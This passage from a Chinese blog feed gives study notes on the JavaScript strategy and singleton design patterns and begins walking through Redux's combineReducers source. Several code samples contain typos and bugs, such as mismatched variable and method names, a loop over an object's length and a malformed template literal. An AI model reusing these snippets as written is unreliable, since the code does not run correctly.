的实现是各异和变化的，每种绩效对应着不同的计算规则。 一个基于策略模式的程序至少由两部分组成。第一部分是一组策略类，策略类封装了具体的算法，并负责具体的计算过程。第二部分是环境类 Context，Context 接受客户的请求，随后把请求委托给某一个策略类。说明 Context 中要维持对某个策略对象的引用。 现在用策略模式来重构上面的代码，第一个版本是模仿传统面向对象语言中实现。把每种绩效的计算规则都封装在对应的策略类里面： 1234567891011121314var performanceS = function()&#123;&#125;performanceS.prototype.calculate = function(salary)&#123; return salary * 4;&#125;var performanceA = function()&#123;&#125;performanceA.prototype.calculate = function(salary)&#123; return salary * 3;&#125;var performanceB = function()&#123;&#125;performanceB.prototype.calculate = function(salary)&#123; return salary * 2;&#125; 定义奖金类 Bonus: 12345678910111213var Bonus = function () &#123; this.salary = null; this.strategy = null;&#125;Bonus.prototype.setSalary = function(salary)&#123; this.salary = salary;&#125;Bonus.prototype.setStrategy = function(salary)&#123; this.strategy = salary;&#125;Bonus.prototype.getBouns = function(salary)&#123; return this.strategy.calculate(this.salary);&#125; 调用： 123456789// bonus 本身没有能力进行计算，而是把请求委托给力之前保存好的策略对象var bonus = new Bonus();bonus.setSalary(1000);bonus.setStrategy(new PerformanceS()); // 设置策略对象console.log(bonus.getBonus()); // 4000bonus.setStrategy(new PerformanceA()); // 设置策略对象console.log(bonus.getBonus()); // 3000 用策略模式重构了这段计算年终奖的代码后，可以看到通过策略模式重构之后，代码变得更加清晰了，各个类的职责更加鲜明了。但这段代码是基于传统面向对象语言的模仿。 JavaScript 版本的策略模式上面代码中，我们让 strategy 对象从各个策略类中创建而来，这是模拟一些传统面向对象语言的实现。实际上在 JavaScript ，函数也是对象，所以更简单和直接的做法是把 stategy 直接定义为函数： 1234567891011var staregies = &#123; 'S':function(salary)&#123; return salary * 4; &#125;, 'A':function(salary)&#123; return salary * 3; &#125;, 'B':function(salary)&#123; return salary * 2; &#125;&#125; 而Context 也没有必要通过 Bonus 来表示，我们依然可以使用 calculateBonus 函数充当 Context 来接受用户的请求。 12345var calculateBonus = function (level, salary) &#123; return strategies[level](salary);&#125;console.log(calculateBonus('S',2000));console.log(calculateBonus('A',3000)); 多态在策略模式中的体现通过使用策略模式重构代码，消除了原来程序中大片的条件分支语句。所有跟计算奖金有关的逻辑都不放在 Context 中，而是分布在各个策略对象中。Context 并没有计算奖金的能力，而是把这个职责委托给了某个策略对象。每个策略对象负责的算法各自封装在对象内部。当我们对这些策略对象发出计算奖金的请求的时候，它们会返回各自不同的计算结果，这正是对象多态性的体现。替换 Context 中当前保存的策略对象，便能执行不同的算法来得到我们想要的结果。 使用策略模式实现缓动动画HTML5 版本的街头霸王游戏，让游戏的主角跳跃或者移动，实际上只是让这个 div 按照一定的缓动算法进行运动而已。 如果我们明白了怎么样让一个小球运动起来，那么离编写一个完整的游戏就不遥远了，剩下的只是一些把逻辑组织起来的体力活。 实现动画效果的原理用 JavaScript 实现动画效果的原理跟动画制作的原理是一样的，动画片是把一些差距不大的原画以较快的帧数播放，来达到视觉上的动画效果。在 JavaScript 中可以通过连续改变元素的某个 CSS 属性，如 top,bottom,background-position 来实现动画效果。 思路和一些准备工作编写一个动画类和缓动算法，rag小球以各种各样的缓动效果在页面中运动。 在运动开始之前，需要提前记录一些有用的信息，至少包括以下信息： 动画开始时，小球所在的原始位置 小球移动的目标位置 动画开始的准确点时间 小球持续运动的时间 随后，我们会用 setInterval 创建一个定时器，定时器每隔19ms 循环一次。在定时器的每一帧里面，我们会把动画消耗的时间、小球的初始位置、小球目标位置和动画持续的总时间等信息传入缓动算法。该算法会通过几个参数，计算出小球当前应该在的位置。最后再更新该 div 对应的 CSS 属性，小球就可以顺利地运动起来了。 让小球运动起来常见的缓动算法，这些算法最初来自 Flash ，但可以非常方便地移植到其他语言中。 这些算法都接受 4 个参数，这 4个参数的含义分别是动画已消耗的时间、小球的初始位置、小球目标位置、动画持续时间，返回的值则是动画元素应该处在的当前位置。代码如下： 1234567891011121314151617181920var tween = &#123; linear: function (t, b, c, d) &#123; return c * t / d + b; &#125;, easeIn: function (t, b, c, d) &#123; return c * (t /= d) * t + b; &#125;, strongEaseIn: function (t, b, c, d) &#123; return c * (t /= d) * t * t * t * t + b; &#125;, strongEaseOut: function (t, b, c, d) &#123; return c * ((t = t / d - 1) * t * t * t * t + 1) + b; &#125;, sineaseIn: function (t, b, c, d) &#123; return c * (t /= d) * t * t + b; &#125;, sineaseOut: function (t, b, c, d) &#123; return c * ((t = t / d - 1) * t * t + 1) + b; &#125;&#125; 接着在页面中放置一个div： 12345&lt;body&gt; &lt;div style="position:absolute;background:blue" id="div"&gt; 我是 div &lt;/div&gt;&lt;/body&gt; 定义 Animate 类，Animate 的构造函数接受一个参数，即将运动起来的 dom 节点。Animate 类的代码如下： 123456789var Animate = function (dom) &#123; this.dom = dom; // 进行运动的 dom 节点 this.startTime = 0; // 动画开始时间 this.startPos = 0; // 动画开始时，dom节点的位置，即 dom 的初始位置 this.endPos = 0; // 动画结束时，dom节点的位置，即 dom 的目标位置 this.properyName = null; // dom 节点需要被改变的 css 属性名 this.easing = null; // 缓动算法 this.duration = null; // 动画持续时间&#125; Animate.prototype.start 方法负责启动这个动画，在动画被启动的瞬间，要记录一些信息，供缓动算法在以后计算小球当前位置的时候使用。在记录完这些消息后，此方法还要负责启动定时器。 1234567891011121314Animate.prototype.start = function (propertyName, endPos, duration, easing) &#123; this.startTime = +new Date; // 动画启动时间 this.startPos = this.dom.getBoundingClientRect()[propertyName]; // dom 节点初始位置 this.properyName = propertyName; this.endPos = endPos; // dom 节点目标位置 this.duration = duration; // 动画持续时间 this.easing = tween[easing]; // 缓动算法 var self = this; var timeId = setInterval(function () &#123; // 启动定时器，开始执行动画 if (self.step() === false) &#123; // 如果动画已结束，则清除定时器 clearInterval(timeId); &#125; &#125;);&#125; start 方法接收四个参数： propertyName：要改变的 CSS 属性名 endPos：小球运动的目标位置 duration：动画持续时间 easing：缓动算法 Animate.prototype.step 方法，代表小球运动的每一帧要做的事情，在此处，这个方法负责计算小球的当前为孩子和调用更新 CSS 属性值的方法 Animate.prototype.update. 12345678910Animate.prototype.step = function () &#123; var t = +new Date; // 取得开始时间 if (t &gt;= this.startTime + this.duration) &#123; // 如果当前时间大于动画开始时间加上动画持续时间，说明动画已经结束了，此时要修正小球的位置。并返回 false 清除时间定时器。 this.update(this.endPos); // 更新小球的 CSS 属性值 return false; &#125; // pos 为小球的位置 var pos = this.easing(t - this.startTime, this.startPos, this.endPos - this.startPos, this.duration); this.update(pos); // 更新小球的 CSS 属性值&#125; 最后是负责更新小球的 CSS 属性值的 Animate.prototype.update 方法： 123Animate.prototype.update = function(pos)&#123; this.dom.style[this.properyName] = pos + 'px';&#125; 测试： 123var div = document.getElementById('div');var animate = new Animate(div);animate.start('left',500,700,'strongEaseOut'); 可以看到，你的div 元素在页面上欢快地滑动。使用策略类把算法传入动画类里，来达到各种不同缓动效果，这些算法都是可以轻易地被替换成另一个算法。这是策略模式的经典运动之一。策略模式的实现并不复杂，关键是如何从策略模式的实现背后，找到封装、委托和多态性这些思想的价值。 更广义的算法策略模式指定是一系列 的算法，并且把它们封装起来。 从定义上看，策略模式是用来封装算法的，但如果把策略模式仅仅用来封装算法，未免有一点大材小用。在实际开发中，通常会把算法的含义扩散开来，使策略模式也可以用来封装一系列的“业务规则”。只要这些业务规则指向的目标一致，并且可以被替换，我们就可以用策略模式来封装它们。 表单验证在一个 Web 项目中，注册、登录、修改用户信息等功能的实现都离不开提交表单。 假设我们正在编写的一个注册的页面，在点击注册按钮之前，有如下几条校验逻辑。 用户名不能为空 密码长度不能少于6位 手机号码必须符合格式 表单校验的第一个版本1234567891011121314151617181920212223&lt;form ation="http://xxx.com/register" id="registerForm" method="post"&gt; 请输入用户名：&lt;input type="text" name="Username"&gt; 请输入密码：&lt;input type="text" name="password"&gt; 请输入手机号码：&lt;input type="text" name="phoneNumber"&gt; &lt;button type="submit"&gt;提交&lt;/button&gt;&lt;/form&gt;&lt;script&gt; var registerForm = document.getElementById('registerForm'); registerForm.onSubmit = function()&#123; if(registerForm.userName.value === '')&#123; alert('用户名不为空'); return false; &#125; if(registerForm.password.length &lt; 6)&#123; alert('密码长度不能少于6位'); return false; &#125; if(!/(^1[3|5|8][0-9]&#123;9&#125;$)/.test(registerForm.phoneNumber.value))&#123; alert('手机号码格式不正确'); return false; &#125; &#125; &lt;/script&gt; 缺点显而易见： registerForm.onSubmit 函数庞大，包含了很多 if-else 语句 函数缺乏弹性，可复用性差 用策略模式重构表单验证下面用策略模式来重构表单验证的代码，第一步把校验逻辑都封装成策略对象： 1234567891011121314151617var strategies = &#123; isNonEmpty:function(value,errorMsg)&#123; if(value === '')&#123; return errorMsg; &#125; &#125;, minLength:function(value,length,errorMsg)&#123; if(value.length &lt; length)&#123; return errorMsg; &#125; &#125;, isMobile:function(value,errorMsg)&#123; if(!/(^1[3|5|8][0-9]&#123;9&#125;$)/.test(value))&#123; return errorMsg; &#125; &#125;&#125; 接下来，我们猪呢比实现 Validator类。Validator 这里作为 Context ，负责接收用户的请求并委托给 strategy 对象。在给出 Validator 类的代码之前，有必要提前了解用户是如何向 Validator 类发送请求的，这有助于我们知道该如何去编写 Validator 类的代码： 1234567891011121314151617181920var validataFunc = function()&#123; var validator = new Validator(); // 创建一个 validator 对象 // 添加一些校验规则 validator.add(registerForm.userName,'isNonEmpty','用户名不为空'); validator.add(registerForm.password,'minLength:6','密码长度不能少于6位'); validator.add(registerForm.phoneNumber,'isMobile','手机号码格式不正确'); var errorMsg = validator.start(); // 获取校验结果 return errorMsg;&#125;var registerForm = document.getElementById('registerForm');registerForm.onSubmit = function()&#123; var errorMsg = validataFunc(); // 如果 errorMsg 有确切的返回值，说明未通过校验 if(errorMsg)&#123; alert(errorMsg); return false; // 阻止表单提交 &#125;&#125; 从上面代码可以看出，通过创建一个 validator 对象，然后通过 validator.add 方法，往 validator 对象中添加了一些校验规则。validator.add 方法接受三个参数。 registerForm.xxx 为参与校验的name 是 xxx 的input 输入框 ‘minLength:6’ 是一个以冒号隔开的字符串。前面是 strategy 对象，后面代表校验过程中的参数。如果没有冒号则说明校验过程中不需要额外的参数信息 第三个参数是当校验不通过的时候返回的错误信息 当我们往 validator 对象添加了一系列的校验规则后，会调用 validator.start(); 方法来启动校验。如果 validator.start 返回一个确切的 errorMsg 字符串当做返回值，说明该次校验没有通过，此时需要返回 false 来阻止表单的提交。 最后是 Validator 类的实现： 1234567891011121314151617181920var Validator = function()&#123; this.cache = []; // 保存校验规则&#125;Validator.prototype.add = function(dom,rule,errorMsg)&#123; var ary = rule.split(':'); // 把 strategy 和 参数分开 this.cache.push(function()&#123; //把校验的步骤用空函数包装起来，并且放入 cache 中 var strategy = ary.shift(); // 用户挑选的 stragety ary.unshift(dom.value); // 把 input 的 value 添加到参数列表的头部 ary.push(errorMsg); // 参数列表尾部推进去 errorMsg return strategies[strategy].apply(dom,ary); &#125;);&#125;Validator.prototype.start = function()&#123; for(var i=0,validataFunc;validataFunc=this.cache[i++];)&#123; var msg = validataFunc(); // 开始校验并取得校验后的返回信息 if(msg)&#123; // 如果有确切的返回信息，则说明校验没有通过 return msg; &#125; &#125;&#125; 使用策略模式重构代码之后，我们仅仅通过 “配置” 的方式完成了一个表单的验证，这些校验规则可以复用在程序的任何地方，还能作为插件来使用，方便被移植到其他项目中。 在修改某个校验规则的时候，主要编写或者改写少量的代码。 给某个文本输入框添加多种校验规则如果我们想校验一个文本是否为空，并且校验它输入的文本的长度不小于10呢？我们期望以这样的形式进行校验： 1234567Validator.add(registerForm,userName,[&#123; stragety:'isNonEmpty', errorMsg:'用户名不能为空'&#125;,&#123; stragety:'minLength:6', errorMsg:'用户名长度不能小于10位' &#125;]); 下面提供的代码可以用于一个文本框对应多种校验规则： 1234567891011121314151617// 改写 add 函数Validator.prototype.add = function(dom,rules)&#123; var self = this; for(var i=0,rule;rule=rules[i++];)&#123; (function(rule)&#123; var strategyAry = rule.stragety.split(':'); var errorMsg = rule.errorMsg; self.cache.push(function()&#123; var strategy = strategyAry.shift(); strategyAry.unshift(dom.value); strategyAry.push(errorMsg); return strategies[stragety].apply(dom,strategyAry); &#125;); &#125;)(rule) &#125;&#125; 测试： 1234567891011121314151617181920212223242526272829303132333435var registerForm = document.getElementById('registerForm');var validataFunc = function()&#123; var validator = new Validator(); validator.add(registerForm.userName,[&#123; strategy: 'isNonEmpty', errorMsg:'用户名不能为空' &#125;,&#123; strategy: 'minLength:10', errorMsg: '用户名长度不能小于 10 位' &#125;]); validator.add(registerForm.password,[&#123; strategy: 'isNonEmpty', errorMsg:'密码不能为空' &#125;,&#123; strategy: 'minLength:6', errorMsg: '密码长度不能小于 6 位' &#125;]); validator.add(registerForm.phoneNumber,[&#123; strategy: 'isNonEmpty', errorMsg:'手机号码不能为空' &#125;,&#123; strategy: 'isMobile', errorMsg: '手机号码格式不正确' &#125;]); var errorMsg = validator.start(); return errorMsg;&#125;registerForm.onsubmit = function()&#123; var errorMsg = validataFunc(); if(errorMsg)&#123; alert(errorMsg); return false; // 阻止表单提交 &#125;&#125; 策略模式的优缺点策略模式是一种常用且有效的设计模式。从上面的三个例子中我们可以总结出来一些策略模式的优点： 策略模式利用组合、委托和多态等技术和思想，可以有效避免多重条件选择语句。 策略模式提供了对开放-封闭原则的完美支持，将算法包装在独立的 strategy 中，使得它们易于切换，易于理解，易于扩展。 策略模式中的算法也可以复用在系统的其他地方，从而避免许多重复的复制粘贴工作。 在策略模式中利用组合和委托来让 Context 拥有执行算法的能力，这也是继承的一种更轻便的替代方案。 首先，使用策略模式会在程序中增加许多策略类或策略对象，但实际上这比把它们负责的逻辑堆砌在 Context 中要好。 其次，要使用 策略模式，必须了解所有的 strategy ,必须了解各个 strategy 之间的不同点，这样才能选择一个合适的 strategy。比如我们要选择旅游出行的路线，必须先了解选择不同交通工具的方案的细节。此时 strategy 要向客户暴露它的所有实现，这是违反最少知识原则的。 一等函数对象与策略模式在以类为中心的传统面向对象语言中，不同的算法或者行为被封装在各个策略类中，Context 将请求委托给这些策略对象，这些策略对象会根据请求返回不同执行的结果，这样便能体现出对象的多态性。 “在函数作为一等对象的语言中，策略模式是隐形的。strategy 就是值为函数的变量”。在 JavaScript 中，除了使用类来封装算法和行为之外，使用函数当然也是一种选择。这些算法可以被封装在函数中并且四处传递，也就是我们常说的 “高阶函数”。实际上在 JavaScript 这种把函数作为一等对象的语言里，策略模式已经融入到了语言本身当中，当我们调用高阶函数来封装不同的行为，并且把它传递到另一个函数里。当我们对这些函数发出 “调用”的消息时候，不同的函数会返回不同的执行结果。在 JavaScript 中，“函数对象的多态性” 来地更加简单。 小结在 JavaScript 语言的策略模式中，策略类往往被函数所替代，这时策略模式就成为了一种 “隐形” 的模式，尽管这样，从头到尾地了解策略模式，不仅可以让我们对该模式有更加的透彻了解，也可以使得我们明白使用函数的好处。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript设计模式——单例模式]]></title>
    <url>%2F2019-02-15-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[学习曾探的 《JavaScript设计模式与开发实践》并做记录。 书籍的购买链接 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 通俗一点，设计模式是在某种场合下对某个问题的一种解决方案。是给面向对象软件开发中的一些好的设计取个名字。 JavaScript设计模式——单例模式单例模式的定义是：保证一个类仅有一个实例，并提供一个访问它的全局访问点 单例模式是一种常用的模式，有一些对象我们往往只需要一个，比如线程池、全程缓存、浏览器中的 window 对象等等。在 JavaScript 开发中，单例模式用途同样广泛。试想一下，当我们单机登录按钮的时候，页面中只会出现一个登录浮窗，而这个登录浮窗是唯一的，无论单击多少次登录按钮，这个浮窗都只会被创建一次，那么这个登录浮窗就适合用单例模式来创建。 实现单例模式要实现一个标准的单例模式并不复杂，无非使用一个变量来标识当前是否已经为某个类创建过对象，如果是，则在下一次获取该类的实例的时候，直接返回之前创建的对象。代码如下: 1234567891011121314151617181920var Singleton = function (name) &#123; this.name = name; this.instance = null;&#125;Singleton.prototype.getName = function () &#123; console.log(this.name);&#125;Singleton.getInstance = function (name) &#123; if (!this.instance) &#123; this.instance = new Singleton(name); &#125; return this.instance;&#125;var a = Singleton.getInstance('sven1');var b = Singleton.getInstance('sven2');console.log(a === b); // true 或者 123456789101112131415var Singleton = function (name) &#123; this.name = name;&#125;Singleton.prototype.getName = function () &#123; console.log(this.name);&#125;Singleton.getInstance = (function () &#123; var instance = null; return function (name) &#123; if (!instance) &#123; instance = new Singleton(name); &#125; return instance; &#125;&#125;)() 我们通过 Singleton.getInstance 来获取 Singleton 类的唯一对象，这种方式相对简单，但有一个问题，就是增加了这个类的 “不透明性”。Singleton 类的使用者必须知道这是一个单例类，跟以往通过 new XX 的方式来获取对象不同，这里用到是 Singleton.getInstance 来获取对象 透明的单例模式实现一个 “透明” 的单例类，用户从这个类中创建对象的时候，可以像使用其他任何普通类一样。在下面的例子中，我们将使用 CreateDiv 单例类，它的作用是负责在页面中创建唯一的 div 节点，代码如下： 12345678910111213141516171819202122var CreateDiv = (function () &#123; var instance; //CreateDiv 的构造函数实际上负责了两件事情，第一是创建对象和执行初始化 init 方法，第二是保证只有一个对象。 var CreateDiv = function (html) &#123; if (instance) &#123; return instance; &#125; this.html = html; this.init(); return instance = this; &#125; CreateDiv.prototype.init = function () &#123; var div = document.createElement('DIV'); div.innerHTML = this.html; document.body.appendChild(div); &#125; return CreateDiv;&#125;)();var c = new CreateDiv('sven1');var d = new CreateDiv('sven2');console.log(c === d); 虽然现在是完成了一个透明的单例类的编写，但是它有一些缺点。 为了把 instance 封装起来，使用自执行匿名函数和闭包，并且让这个匿名函数返回真正的 Singleton 构造方法，增加了一些程序的复杂度，阅读起来也不是很舒服。 用代理实现单例模式在上面的代码中进行改造，首先在 CreateDiv 构造函数中，把负责管理单例的代码移出去，让它成为一个普通的创建 div 的类： 12345678910var CreateDiv = function (html) &#123; this.html = html; this.init();&#125;CreateDiv.prototype.init = function () &#123; var div = document.createElement('div'); div.innerHTML = this.html; document.body.appendChild(div);&#125; 接下来映日 代理类 ProxySingletonCreateDiv: 123456789var ProxySingletonCreateDiv = (function () &#123; var instance; return function (html) &#123; if (!instance) &#123; instance = new CreateDiv(html); &#125; return instance; &#125;&#125;)(); 通过引用代理类的方法，我们同样完成了一个单例模式的编写，跟之前不同的是，现在我们把负责管理单例的逻辑移到了代理类中，这样一来，CreateDiv 就变成了一个普通的类，它跟代理类组合起来可以达到单例模式的效果。 这个例子是缓存代理的应用之一。 JavaScript 中的单例模式单例的核心是确保只有一个实例，并提供全局访问。 单例对象是从 “类” 中创建而来的，在以类为中心的语言中，这是很自然的做法。比如在 Java 中，需要某个对象，就必须先定义一个，对象总是从类中创建的。 但 JavaScript 其实一门 无类的语言，正是因为这样，生搬单例模式的概念并无意义。 全局变量不是单例模式，但在 JavaScript 开发中，我们经常会把全局变量当做单例来使用。 例如： 1var a = &#123;&#125;; 当用这种方式创建对象 a 时，对象 a 确实是独一无二的。如果 a 变量被声明在全局作用域下，则我们可以在代码中的任何位置使用这个变量，全局变量提供给全局访问是理所当然的。这样就满足了单例模式的两个条件。 但是全局变量存在很多问题，它很容易造成命名空间污染。 我们有必要尽量减少全局变量的使用，即使需要，也要把它的污染降到最低。以下几种方式可以相对降低全局变量带来的命名污染。 1.使用命名空间适当地使用命名空间，并不会杜绝全局变量，但是可以减少全局变量的数量 最简单的方法依然是使用对象字面量的方式： 12345678910111213141516171819202122232425262728293031var namespace1 = &#123; a:function()&#123; console.log(1) &#125;, b:function()&#123; console.log(2) &#125;&#125;// 把 a 和 b 都定义为 namespace1 的属性，可以减少变量和全局作用域打交道的机会。另外，还可以动态地创建命名空间。var MyApp = &#123;&#125;;MyApp.namespace = function(name)&#123; var parts = name.split('.'); var current = MyApp; for(var i in parts)&#123; if(!current[parts[i]])&#123; current[parts[i]] = []; &#125; current = current[parts[i]] &#125;&#125;MyApp.namespace('event');MyApp.namespace('dom.style');console.log(MyApp);// 上面代码等价于 var MyApp = &#123; event:&#123;&#125;, dom:&#123; style:&#123;&#125; &#125;&#125; 2.使用闭包封装私有变量这种方法把一些变量封闭在闭包的内部，只暴露一些接口跟外界通信： 123456789var user = (function()&#123; var __name = 'sven', __age = 29; return &#123; getUserInfo:function()&#123; return __name + '_' + __age; &#125; &#125;&#125;)(); 这里用下划线来约定私有变量，它们被封装在闭包产生的作用域中，外部是访问不到这两个变量的，这就避免了对全局的命令污染。（现在没有这样来定义私有变量，一般是使用 Symbol） 惰性单例惰性单例指的是需要的时候才创建对象实例。惰性单例是单例模式的重点，这种技术是实际开发中非常有用的，有用的程度可能超出了我们的想象。instance 实例对象总是在我们调用 Singleton.getInstance 的时候才被创建，而不是在页面加载好的时候就被创建。代码如下： 123456789Singleton.getInstance = (function()&#123; var instance = null; return function(name)&#123; if(!instance)&#123; instance = new Singelton(name); &#125; return instance; &#125;&#125;)(); 不过这是基于“类” 的单例模式，基于 “类” 的单例模式在 JavaScript 中并不适用。下面用 WebQQ 的登录浮窗为例子，介绍与全局变量结合实现惰性的实例。 假设我们是 WebQQ 的开发人员（网址是web.qq.com），当点击左边导航里 QQ 头像时，会弹出一个登录浮窗很明显这个浮窗在页面里总是唯一的，不可能出现同时存在两个登录窗口的情况。 第一种解决方案就是在页面加载完成的时候创建好这个 div 浮窗，这个浮窗一开始肯定是隐藏状态，当用户点击登录按钮的时候就显示： 1234567891011121314151617&lt;html&gt; &lt;body&gt; &lt;button id="loginBtn"&gt;登录&lt;/button&gt; &lt;/body&gt; &lt;script&gt; var loginLayer = (function()&#123; var div = document.createElement('div'); div.innerHTML = '我是登录浮窗'； div.style.display = 'none'; document.body.appendChild(div); return div; &#125;)(); document.getElementById('loginBtn').onClick=function()&#123; loginLayer.style.display = 'block'; &#125;; &lt;/script&gt;&lt;/html&gt; 这种方式有一个问题就是，也许我们进入 WebQQ 只是玩玩游戏或者看看天气，根本不需要进行登录操作，因为登录浮窗总是一开始就被创建好，那么很有可能将白白浪费一些 DOM 节点。 改变一下代码，使用户点击登录按钮的时候才开始创建浮窗 123456789101112131415161718&lt;html&gt; &lt;body&gt; &lt;button id="loginBtn"&gt;登录&lt;/button&gt; &lt;/body&gt; &lt;script&gt; var createLoginLayer = function()&#123; var div = document.createElement('div'); div.innerHTML = '我是登录浮窗'； div.style.display = 'none'; document.body.appendChild(div); return div; &#125;; document.getElementById('loginBtn').onClick=function()&#123; var loginLayer = createLoginLayer(); loginLayer.style.display = 'block'; &#125;; &lt;/script&gt;&lt;/html&gt; 虽然现在达到了惰性的目的，但失去了单例的效果，当我们点击登录按钮的时候，都会创建一个新的登录浮窗 div ，虽然我们可以在点击浮窗上的关闭时把这个浮窗从页面中删除，但这样频繁地创建和删除节点明显是不合理的，也是不必要的。 可以用一个变量来判断是否已经创建过登录浮窗 12345678910111213141516var createLoginLayer = (function()&#123; var div; return function()&#123; if(!div)&#123; div = document.createElement('div'); div.innerHTML = '我是登录浮窗'； div.style.display = 'none'; document.body.appendChild(div); &#125; return div; &#125;&#125;)();document.getElementById('loginBtn').onClick=function()&#123; var loginLayer = createLoginLayer(); loginLayer.style.display = 'block';&#125;; 通用的惰性单例上面虽然完成了一个可用的惰性单例，但是它还有如下的一些问题。 代码仍然是违反单一职责原则的，创建对象和管理单例的逻辑都放在 createLoginLayer 对象内部。 如果我们下次需要创建一个页面中唯一的 iframe 的时候，或者 script 标签，用来跨域请求数据，就必须如法炮制，把 createLoginLayer 函数几乎抄多一遍 1234567891011var createIframe = (function()&#123; var iframe; return function()&#123; if(!iframe)&#123; iframe = document.createElement('iframe'); iframe.style.display = 'none'; document.body.appendChild(iframe); &#125; return iframe; &#125;&#125;)(); 可以看出，实际上管理单例的逻辑其实是完全可以抽象出来的，这个逻辑始终是一样的：用一个变量来标志是否创建了对象，如果是，则在下次直接返回这个已经创建好的对象。 1234var obj;if(!obj)&#123; obj = xxx;&#125; 我们把如何管理单例的逻辑从原来的代码中抽离出来，这些逻辑被封装在 getSingle 函数内部，创建对象的方法 fn 被当做参数动态传入 getSingle 函数中： 123456var getSingle = function (fn) &#123; var result; return function () &#123; return result || (result = fn.apply(this, arguments)) &#125;&#125; 接下来用于创建登录浮窗的方法用 fn 的形式传入到这个 getSingle。我们可以传入任何我们想创建的东西。之后让 getSingle 返回一个新的函数，并用一个变量 result 来保存 fn 的计算结果。result 变量因为身在闭包中，它永远不会被销毁。在将来的请求中，如果 result 已经被赋值了，那么它将返回这个值。 1234567891011121314151617181920212223var createLoginLayer = function()&#123; var div = document.createElement('div'); div.innerHTML = '我是登录浮窗'； div.style.display = 'none'; document.body.appendChild(div); return div;&#125;var createSingleLoginLayer = getSingle(createLoginLayer);document.getElementById('loginBtn').onClick=function()&#123; var loginLayer = createSingleLoginLayer(); loginLayer.style.display = 'block';&#125;;// 下面再试试创建唯一的 iframe 用于动态加载第三方页面var createSingleIframe = getSingle(function()&#123; var iframe = document.createElement('iframe'); document.body.appendChild(iframe); return iframe;&#125;);document.getElementById('loginBtn').onClick=function()&#123; var loginLayer = createSingleIframe(); loginLayer.src = 'http://laibh.top';&#125;; 上面的例子中，把创建实例对象的职责和管理单例的职责分别放置在了两个方法里，这两个方法可以独立变化而互不影响，当它们连接在一起的时候，就完成了创建唯一实例对象的功能。 这种单例模式的用途远不止创建对象，比如我们通常渲染页面中的一个列表之后，接下来要给这个列表绑定一个 click 事件，如果是通过 ajax 动态往列表里追加数据，在使用事件代理的前提下，click 事件实际上只需要在第一次渲染列表的时候被绑定一次，但是我们不想去判断当前是否是第一次渲染列表，如果借助JQ，我们通常选择给节点绑定 one 事件： 123456789101112var bindEvent = function () &#123; $('div').one('click', function () &#123; console.log('click'); &#125;);&#125;var render = function () &#123; console.log('开始渲染列表'); bindEvent();&#125;render();render();render(); 如果使用 getSingle 函数也可以达到一样的效果，代码如下： 123456789101112131415var bindEvent = getSingle(function()&#123; document.getElementById('div1').onclick = function()&#123; console.log('click'); &#125;; return true;&#125;);var render = function () &#123; console.log('开始渲染列表'); bindEvent();&#125;render();render();render(); 可以看到 render 函数 和 bindEvent 函数分别都执行了 3 次，但是 div 实际上只被绑定了一个事件。 小结单例模式是一种简单但非常实用的模式。特别是惰性单例技术，在合适的时候才创建对象，并只创建唯一的一个。更奇妙的是，创建对象和管理单例的职责被分布在两个不同的方法中，这两个方法组合起来才具有单例模式的威力。]]></content>
      <categories>
        <category>JavaScript设计模式</category>
      </categories>
      <tags>
        <tag>JavaScript设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redux 的几个核心函数源码]]></title>
    <url>%2F2019-02-15-Rudex%E7%9A%84%E5%87%A0%E4%B8%AA%E6%A0%B8%E5%BF%83%E5%87%BD%E6%95%B0%E6%BA%90%E7%A0%81.html</url>
    <content type="text"><![CDATA[根据订阅发布设计模式看了要模仿的一个功能，看着看着坑越挖越多，涉及到了redux 。顺便尝试吃了一下 redux 的几个核心函数的源码，初生涩隐有启发并作记录。 Redux 的几个核心函数源码combineReducers12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061function combineReducers(reducers) &#123; const reducerKeys = Object.keys(reducers); const finalReducers = &#123;&#125;; for (let i = 0; i &lt; reducerKeys.length; i++) &#123; const key = reducerKeys[i]; if (process.env.NODE_ENV !== 'production') &#123; if (typeof reducers[key] === 'undefined') &#123; warning('No reducer provided for key' $&#123; key &#125;); &#125; &#125; if (typeof reducers[key] === 'function') &#123; finalReducers[key] = reducers[key] &#125; &#125; const finalReducerKeys = Object.keys(finalReducers); let unexpectedKeyCache; if (process.env.NODE_ENV !== 'production') &#123; unexpectedKeyCache = &#123;&#125;; &#125; let shapeAssertionError; try &#123; // 判断传入的 reducer 格式是否正确，函数作用为传入的 type 不存在时，是否会返回默认值 assertReducerShape(finalReducers) &#125; catch (e) &#123; shapeAssertionError = e; &#125; return function combination(state = &#123;&#125;, action) &#123; // 如果存在不返回默认值的 reducer,抛出异常 if (shapeAssertionError) &#123; throw shapeAssertionError &#125; // 发出警告 不影响程序执行 if (process.env.NODE_ENV !== 'production') &#123; const warningMessage = getUnexpectedStateShapeWarningMessage(state, finalReducers, action, unexpectedKeyCache); if (warningMessage) &#123; warning(warningMessage) &#125; &#125; // 记录是否发生了变化，重点 let hasChanged = false; // 要返回的下一个状态 const nextState = &#123;&#125;; for (let i = 0; i &lt; finalReducers.length; i++) &#123; const key = finalReducerKeys[i]; const reducer = finalReducers[key]; // 使用该函数的要求，每个 reducer 的 key 值要和当前操作的 state 的参数同名，比如传入的 card:cardReducer,那么 state 操作的参数就必须是 state.card const previousStateForKey = state[key]; const nextStateForKey = reducer(previousStateForKey, action); if (typeof nextStateForKey === 'undefined') &#123; const errorMessage = getUndefinedStateErrorMessage(key, action); throw new Error(errorMessage); &#125; // 执行了 reducer 之后的结果 nextState[key] = nextStateForKey; // 每次执行之后的结果，再综合上一次得到的 hasChanged,得到最终的 state 是否发生了变化 hasChanged = hasChanged || nextStateForKey !== previousStateForKey; &#125; // 如果发生了变化，就要返回新的 state -&gt; nextState return hasChanged ? nextState : state; &#125;&#125; bindActionCreators12345678910111213141516171819202122232425function bindActionCreator(actionCreator, dispatch) &#123; return (...args) =&gt; dispatch(actionCreator(..args));&#125;function bindActionCreators(actionCreators, dispatch) &#123; // 可以只传入一个函数作为参数，它会给这个函数的返回结果添加 dispatch 处理 if (typeof actionCreators 